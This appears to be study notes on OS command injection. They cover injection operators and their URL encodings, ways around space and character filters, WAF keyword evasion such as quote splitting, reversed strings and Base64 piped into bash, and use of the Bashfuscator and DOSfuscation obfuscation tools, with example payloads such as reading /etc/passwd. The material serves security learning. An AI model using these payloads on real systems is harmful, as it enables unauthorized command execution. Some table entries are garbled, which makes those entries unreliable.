# Command injection

### Command Injection Methods

To inject an additional command to the intended one, we may use any of the following operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\\|`                   | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\\|`                   | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\\|`                             |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\\|`                                     |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\\|`                                     |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

#### **Bypass Techniques for Space Filters**

The module details three specific methods to represent a space without actually using the space bar:

| **Technique**          | **Payload Example**        | **How it Works**                                                                                                                                                       |
| ---------------------- | -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Using Tabs (`%09`)** | `127.0.0.1%0a%09whoami`    | Linux and Windows treat the horizontal tab character as a valid separator between a command and its arguments.                                                         |
| **Using `${IFS}`**     | `127.0.0.1%0a${IFS}whoami` | `${IFS}` (Internal Field Separator) is a Linux environment variable that defaults to a space and a tab. The shell replaces the variable with a space during execution. |
| **Brace Expansion**    | `127.0.0.1%0a{ls,-la}`     | A Bash feature that automatically inserts spaces between comma-separated arguments within curly braces when the command is run.                                        |

`${VARIABLE:START_INDEX:NUMBER_OF_CHARACTERS}`

These are the examples for the above one

```
┌──(umedh㉿kali)-[~]
└─$ echo ${path}
/usr/local/go/bin /usr/local/go/bin /home/umedh/.local/bin /usr/share/pyenv/shims /usr/share/pyenv/bin /usr/local/sbin /usr/sbin /sbin /usr/local/bin /usr/bin /bin /usr/local/games /usr/games /snap/bin /home/umedh/.dotnet/tools /snap/bin /usr/local/go/bin /home/umedh/go/bin /usr/local/go/bin /home/umedh/go/bin /home/umedh/go/bin /home/umedh/go/bin

┌──(umedh㉿kali)-[~]
└─$ echo ${path:0:1}
/usr/local/go/bin

┌──(umedh㉿kali)-[~]
└─$ echo ${path:1:1}
/usr/local/go/bin

┌──(umedh㉿kali)-[~]
└─$ echo ${path:1:4}
/usr/local/go/bin /home/umedh/.local/bin /usr/share/pyenv/shims /usr/share/pyenv/bin

┌──(umedh㉿kali)-[~]
└─$ echo ${path:10:1}
/bin

┌──(umedh㉿kali)-[~]
└─$ echo ${path:10:2}
/bin /usr/local/games

┌──(umedh㉿kali)-[~]
└─$ echo ${path:2:1}
/home/umedh/.local/bin
```

The command `echo %HOMEPATH:~6,-11%` tells Windows to take the value of the `%HOMEPATH%` variable and "slice" it.

| **Part**         | **Meaning**                                                               |
| ---------------- | ------------------------------------------------------------------------- |
| **`echo`**       | Prints the result to the screen.                                          |
| **`%HOMEPATH%`** | A Windows variable that usually points to `\Users\YourName`.              |
| **`:~`**         | The trigger for substring manipulation.                                   |
| **`6`**          | **The Offset:** Skip the first 6 characters of the string.                |
| **`-11`**        | **The Length:** Remove the last 11 characters from the end of the string. |

**A Practical Example**

Let’s assume your username is **Umedh** (as seen in your earlier Kali logs). On a Windows machine, your `%HOMEPATH%` would be `\Users\umedh`.

If we apply `~6,-11` to a longer path, like **`\Users\Administrator`**:

1. **Original String:** `\Users\Administrator` (20 characters total)
2. **Offset `6`:** Skip `\Users`. We are left with `\Administrator`.
3. **Length `-11`:** Count 11 characters back from the very end of "Administrator" and delete them.
4. **Result:** You are left with a tiny fragment of the original word.

| **OS**            | **Target Char**     | **Command / Payload**   | **Logic Breakdown**                                        |
| ----------------- | ------------------- | ----------------------- | ---------------------------------------------------------- |
| **Linux**         | **Slash (`/`)**     | `${PATH:0:1}`           | Starts at index **0** of `$PATH`, takes **1** character.   |
| **Linux**         | **Semicolon (`;`)** | `${LS_COLORS:10:1}`     | Slices the 11th character from the `LS_COLORS` string.     |
| **Linux**         | **Space**           | `${IFS}`                | Internal Field Separator; defaults to space/tab.           |
| **Windows (CMD)** | **Backslash (`\`)** | `%HOMEPATH:~6,-11%`     | Skips 6 chars, removes last 11. Results in `\`.            |
| **Windows (PS)**  | **Backslash (`\`)** | `$env:HOMEPATH[0]`      | Treats the variable as an array; picks the 1st char.       |
| **Linux**         | **Any (Shift)**     | `$(tr '!-}' '"-~'<<<[)` | Shifts the character `[` forward by 1 in ASCII to get `\`. |

Here is the breakdown of the command: `$(tr '!-}' '"-~'<<<[)`

**The Command Anatomy**

| **Component** | **Part**        | **Purpose**                                                                                                             |
| ------------- | --------------- | ----------------------------------------------------------------------------------------------------------------------- |
| **`tr`**      | **Translate**   | The Linux command used to swap one set of characters for another.                                                       |
| **`'!-}'`**   | **Set 1**       | The "Input Range." It represents almost all printable ASCII characters starting from `!` (ASCII 33) to `}` (ASCII 125). |
| **`'"-~'`**   | **Set 2**       | The "Output Range." It starts one position higher, from `"` (ASCII 34) to `~` (ASCII 126).                              |
| **`<<<`**     | **Here-String** | Redirects the character on the right into the `tr` command as input.                                                    |
| **`[`**       | **The Input**   | The character we want to shift. In ASCII, `[` is **91**.                                                                |

**How the "Shift" Happens**

The `tr` command maps the first set to the second set one-to-one. Because Set 2 starts exactly **one character after** Set 1, every character that passes through is "pushed" forward by one.

**The Calculation:**

1. You provide **`[`** (ASCII 91).
2. `tr` looks at its map. Since Set 2 is shifted by +1, it finds the character at position 92.
3. ASCII 92 is the **Backslash (`\`)**.
4. The shell executes `$(...)`, which turns that output into a usable part of your command.

***

#### **Practical Example: Generating a Semicolon (`;`)**

If the `;` (ASCII 59) is blacklisted, you find the character immediately before it in the ASCII table, which is the **Colon (`:`)** (ASCII 58).

**The Payload:** `echo $(tr '!-}' '"-~'<<<:)`

* **Input:** `:` (58)
* **Shift:** +1
* **Result:** `;` (59)

Even when you bypass character filters (like spaces or slashes), a Web Application Firewall (WAF) might still block specific "dangerous" words like `whoami`, `cat`, or `id`.

| **Technique**                   | **Target OS**   | **Example Payload**          | **How it Works**                                                                              |
| ------------------------------- | --------------- | ---------------------------- | --------------------------------------------------------------------------------------------- |
| **Single/Double Quotes**        | Linux & Windows | `w'h'o'am'i` or `w"h"o"am"i` | The shell removes quotes before execution. WAF fails to find the exact string `whoami`.       |
| **Backslash (`\`)**             | Linux Only      | `w\ho\am\i`                  | The backslash escapes the next character (which is just a letter), so it's ignored by Bash.   |
| **Positional Parameter (`$@`)** | Linux Only      | `who$@ami`                   | `$@` represents "all arguments." In this context, it's empty, so Bash ignores it.             |
| **Caret (`^`)**                 | Windows Only    | `who^ami`                    | The caret is the escape character for CMD. It is ignored when placed inside a command string. |

| **Technique**         | **Target OS** | **Payload Example**                                                                      | **Logic Breakdown**                                                                      |
| --------------------- | ------------- | ---------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| **Case Manipulation** | **Windows**   | `WhOaMi`                                                                                 | Windows is **case-insensitive**; `WhOaMi` executes exactly like `whoami`.                |
| **Case Manipulation** | **Linux**     | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                                                       | Uses `tr` to force the string to lowercase before executing it in a subshell.            |
| **Reversed Command**  | **Linux**     | `$(rev<<<'imaohw')`                                                                      | The string `imaohw` is reversed by the `rev` command and then executed.                  |
| **Reversed Command**  | **Windows**   | `iex "$('imaohw'[-1..-20] -join '')"`                                                    | PowerShell reverses the string using array indexing (`-1..-20`) and executes via `iex`.  |
| **Base64 Encoding**   | **Linux**     | `bash<<<$(base64 -d<<<Y2F0...==)`                                                        | Decodes a Base64 string and "pipes" the result directly into a `bash` shell using `<<<`. |
| **Base64 Encoding**   | **Windows**   | `iex "$([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('...')))"` | Decodes a Base64 string in PowerShell and executes the resulting command string.         |

\*\*Bashfuscator automaction for the linux server command injection

A handy tool we can utilize for obfuscating bash commands is Bashfuscator for linux

| **Flag**               | **Full Name** | **Purpose**                                                                            | **Example**                           |
| ---------------------- | ------------- | -------------------------------------------------------------------------------------- | ------------------------------------- |
| **`-c`**               | `--command`   | The literal command string you want to hide.                                           | `-c "whoami"`                         |
| **`-f`**               | `--file`      | Obfuscates an entire script file instead of a single command.                          | `-f exploit.sh`                       |
| **`-s`**               | `--size`      | Controls the complexity/length of the output (**1**=Small, **2**=Medium, **3**=Large). | `-s 2`                                |
| **`-t`**               | `--layers`    | Determines how many times the code is wrapped in new obfuscation.                      | `-t 3`                                |
| **`-l`**               | `--list`      | Lists all available mutators, encoders, and compressors.                               | `python3 bashfuscator -l`             |
| **`-o`**               | `--output`    | Saves the final obfuscated result to a specific file.                                  | `-o payload.txt`                      |
| **`--choose-mutator`** | N/A           | Manually selects a specific mutator if you know which one works.                       | `--choose-mutator token/special_char` |

```
bashfuscator -c "cat /etc/passwd" -s 1 -t 2 --no-cleanup
```

**`--no-cleanup`**: Useful for debugging, as it shows you the intermediate files created during the process.

\*\*DOSfuscation automaction for the windows server command injection

_To activate these tool_

```
┌──(umedh㉿kali)-[~]
└─$ pwsh
PowerShell 7.5.4

┌──(umedh㉿kali)-[/home/umedh]
└─PS> cd tools

┌──(umedh㉿kali)-[/home/umedh/tools]
└─PS> cd ./Command-Injection/

┌──(umedh㉿kali)-[/home/umedh/tools/Command-Injection]
└─PS> cd Invoke-DOSfuscation

┌──(umedh㉿kali)-[/home/umedh/tools/Command-Injection/Invoke-DOSfuscation]
└─PS> import-Module .\Invoke-DOSfuscation.psd1

# After these we want to type these
Invoke-DOSfuscation # Then these tool works
```

There is also a very similar tool that we can use for Windows called DOSfuscation

| **Category** | **Menu Flag** | **Purpose**                                           | **Example / Result**           |
| ------------ | ------------- | ----------------------------------------------------- | ------------------------------ |
| **String**   | `STRING`      | Scrambles strings using environment variables.        | `set a=wh& set b=oami& %a%%b%` |
| **Command**  | `COMMAND`     | Adds escape characters (like `^`) to command names.   | `w^ho^am^i`                    |
| **Reverse**  | `REVERSE`     | Flips the command and uses a loop to rebuild it.      | `for /L %i in (index) do ...`  |
| **Encoding** | `ENCODING`    | Converts the command into Hex or Octal codes.         | `cmd /c "0x77 0x68..."`        |
| **Finisher** | `FINISHER`    | Adds a final wrapper (like `cmd /c` or `/k`).         | `cmd /V:ON /C "payload"`       |
| **Test**     | `TEST`        | Runs the current payload to see if it actually works. | _Executes command locally_     |

```
Invoke-DOSfuscation -Command "type C:\flag.txt" -ObfuscationLevel 2 -Type REVERSE
```
